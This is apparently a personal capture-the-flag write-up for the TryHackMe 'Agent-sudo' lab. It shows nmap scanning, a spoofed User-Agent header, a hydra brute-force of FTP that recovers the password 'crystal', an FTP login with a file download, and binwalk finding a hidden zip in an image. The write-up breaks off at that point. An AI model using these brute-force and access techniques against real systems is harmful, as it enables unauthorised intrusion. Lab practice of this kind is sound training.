### Agent-sudo

export IP - 10.10.25.133

#### Author's Note

Welcome to another THM exclusive CTF room. Your task is simple, capture the flags just like the other CTF room. Have Fun!

If you are stuck inside the black hole, post on the forum or ask in the TryHackMe discord.


#### Enumerate

Enumerate the machine and get all the important information

How many open ports?
- 3

```
┌──(kali㉿kali)-[~/ken/MoonShine/CTF/Agent-sudo]
└─$ nmap -sC -sV -oN nmap_results.txt 10.10.25.133
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-18 10:28 EDT
Nmap scan report for 10.10.25.133
Host is up (0.71s latency).
Not shown: 990 closed tcp ports (conn-refused)
PORT      STATE    SERVICE  VERSION
21/tcp    open     ftp      vsftpd 3.0.3
22/tcp    open     ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
|_  256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)
80/tcp    open     http     Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Annoucement
|_http-server-header: Apache/2.4.29 (Ubuntu)
212/tcp   filtered anet
544/tcp   filtered kshell
2013/tcp  filtered raid-am
4004/tcp  filtered pxc-roid
8649/tcp  filtered unknown
15000/tcp filtered hydap
41511/tcp filtered unknown
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 212.52 seconds
                                                              
```

Looking at the webpage we are greeted with a message:

![[Pasted image 20220818203145.png]]

From there we can use burp to check what is happening:

![[Pasted image 20220818203258.png]]

Upon checking, we can see the `User-Agent` that Agent R is referring. We can change this to C, like so:

![[Pasted image 20220818203403.png]]

After that we are greeted by a redirection page:

![[Pasted image 20220818203431.png]]

![[Pasted image 20220818203442.png]]

![[Pasted image 20220818203458.png]]

Using these information, we can now use hydra to crack ftp password (remember nmap, port 22 and port 80?) since Agent R said password is weak:

```
┌──(kali㉿kali)-[~/ken/MoonShine/CTF/Agent-sudo]
└─$ hydra -l chris -P /usr/share/wordlists/rockyou.txt 10.10.170.97 ftp -t 4
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-08-18 20:24:14
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking ftp://10.10.170.97:21/
[STATUS] 48.00 tries/min, 48 tries in 00:01h, 14344351 to do in 4980:41h, 4 active
[STATUS] 48.00 tries/min, 144 tries in 00:03h, 14344255 to do in 4980:39h, 4 active
[21][ftp] host: 10.10.170.97   login: chris   password: crystal
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-08-18 20:29:35
                                                                                                                       
┌──(kali㉿kali)-[~/ken/MoonShine/CTF/Agent-sudo]
└─$ 


```

#### Hash cracking and brute-force

Done enumerate the machine? Time to brute your way out.

FTP Password: crystal

Use the username and password acquired from earlier 

```
┌──(kali㉿kali)-[~/ken/MoonShine/CTF/Agent-sudo]
└─$ ftp 10.10.170.97
Connected to 10.10.170.97.
220 (vsFTPd 3.0.3)
Name (10.10.170.97:kali): chris
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||62242|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
226 Directory send OK.
ftp> get To_agentJ.txt
local: To_agentJ.txt remote: To_agentJ.txt
229 Entering Extended Passive Mode (|||10689|)
150 Opening BINARY mode data connection for To_agentJ.txt (217 bytes).
100% |**************************************************************************|   217        1.39 MiB/s    00:00 ETA
226 Transfer complete.
217 bytes received in 00:00 (0.29 KiB/s)
ftp> 

```


![[Pasted image 20220818203845.png]]

Using binwalk, i checked for any zip files inside the pictures:

```

┌──(kali㉿kali)-[~/ken/MoonShine/CTF/Agent-sudo]
└─$ binwalk cutie.png

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22

                                                                                                                      
┌──(kali㉿kali)-[~/ken/MoonShine/CTF/Agent-sudo]
└─$ binwalk cute-alien.jpg 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, JFIF standard 1.01

                                                                                                                      
┌──(kali㉿kali)-[~/ken/MoonShine/CTF/Agent-sudo]


```








